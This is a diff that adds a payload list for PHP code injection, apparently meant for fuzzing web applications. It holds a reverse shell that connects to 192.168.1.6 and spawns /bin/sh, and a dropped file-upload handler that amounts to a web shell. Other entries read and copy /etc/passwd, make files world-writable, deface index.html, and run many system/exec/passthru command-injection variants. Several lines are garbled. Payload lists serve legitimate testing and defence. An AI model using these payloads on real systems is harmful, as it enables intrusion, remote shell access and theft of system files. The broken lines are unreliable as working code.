@@ -1,0 +1,64 @@
+$file = fopen ("phpinfo-1.php", "W"); echo fwrite ($file, "<?php phpinfo(); ?>"); fclose ($file)
+$file = fopen("pshell.php", "w"); echo fwrite($file, "php -r '$sock=fsockopen ('192.168.1.6' ,443) ;' /bin/sh -i <83 >83 2-83' ;"); fclose($file)
+$file = fopen ("testl.txt", "w"); echo fwrite($file, "Hello World. Testing!"); fclose($file)
+$file = fopen ("upload2.php", "w"); echo fwrite($file, '<html><form action="upload2.php" method="post" enctype="multipart/form-data">Select image to upload; <input type="file" name="fileToUpload" id="fileToUpload"><input type="submit" value="Upload" name="submit"></form></html><?php if( isset ($_POST["submit"])){ $file_name = $_FILES["fileToUpload"] ["name"]; $file_tmp_name = $FILES["fIleToUpload"("tmpname"]; if (move uploaded_file($file_tmp_ name, " ./" . $file_name)) { echo "ok"; } } ?>'); fclose($file)
+chmod("index.html",0777);
+CHMOD("index.html",0777);
+echo%20copy("/etc/passwd","/tmp/passwd");
+echo%20file_exists("/etc/passwd");
+ECHO%20FILE_EXISTS("/etc/passwd");
+echo%20file_exists("index.html");
+ECHO%20FILE_EXISTS("index.html");
+echo%20file_exists("/tmp/passwd");
+echo%20file_get_contents("/etc/passwd");
+ECHO%20FILE_GET_CONTENTS("/etc/passwd");
+echo%20fileperms("/etc/passwd");
+ECHO%20FILEPERMS("/etc/passwd");
+echo%20fileperms("index.html");
+ECHO%20FILEPERMS("index.html");
+echo%20file_put_contents("index.html","Hello%20World.%20Testing!");
+ECHO%20FILE_PUT_CONTENTS("index.html","HELLO%20WORLD.%20TESTING!");
+echo 'id'
+exec("id")
+EXEC("id")
+exec("ping -c 4 192.168.1.6")
+file get contents ("/etc/passwd")
+&&id
+'id'
+;id
+;id;
+passthru("id")
+passthru('id')
+PASSTHRU("id")
+PASSTHRU('id')
+pcntl_exec("/usr/bin/uptime")
+phpinfo()
+PHPINFO()
+phpinfo();id
+PHPINFO();id
+phpinfo();system('cat /etc/passwd')
+phpinfo();system('id')
+PHPINFO();SYSTEM('id')
+print_r($_POST);system('id')
+PRINT_R($_POST);SYSTEM('id')
+print_r(glob("*.config"));
+print_r(glob("*.html"));
+print_r(glob("*.txt"));
+readfile("/etc/passwd");
+readfile?"/etc/passwd")
+READFILE("/etc/passwd")
+readfile("index.html");
+READFILE("index.html")
+shell exec("id")
+SHELL EXEC("id")
+system(%27id%27)
+;system('cat /etc/passwd')
+system('cat /etc/passwd');
+;system('id')
+system("id")
+system('id')
+;SYSTEM('id')
+SYSTEM("id")
+system('id');phpinfo()
+SYSTEM('id');PHPINFO()
+;system('/usr/bin/id')
